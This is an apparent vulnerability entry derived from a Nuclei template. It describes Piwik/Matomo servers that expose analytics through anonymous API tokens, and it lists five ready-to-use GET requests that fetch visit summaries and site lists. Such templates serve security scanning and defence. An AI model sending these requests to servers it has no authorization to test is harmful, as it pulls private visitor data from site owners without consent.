# Vulnerability: Piwik/Matomo - Unauthenticated Access
**Classification:** PIWIK
**Source:** Nuclei Template (`piwik-unauthenticated-access.yaml`)

## Description
Detected Piwik/Matomo instances exposing analytics data without authentication. When anonymous access was enabled, the API returned visitor statistics, page views, and other sensitive analytics data using the anonymous token.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?module=API&method=VisitsSummary.get&idSite=1&period=day&date=today&format=json&token_auth=anonymous
GET {{BaseURL}}/matomo/index.php?module=API&method=VisitsSummary.get&idSite=1&period=day&date=today&format=json&token_auth=anonymous
GET {{BaseURL}}/piwik/index.php?module=API&method=VisitsSummary.get&idSite=1&period=day&date=today&format=json&token_auth=anonymous
GET {{BaseURL}}/index.php?module=API&method=SitesManager.getAllSites&format=json&token_auth=anonymous
GET {{BaseURL}}/matomo/index.php?module=API&method=SitesManager.getAllSites&format=json&token_auth=anonymous
```

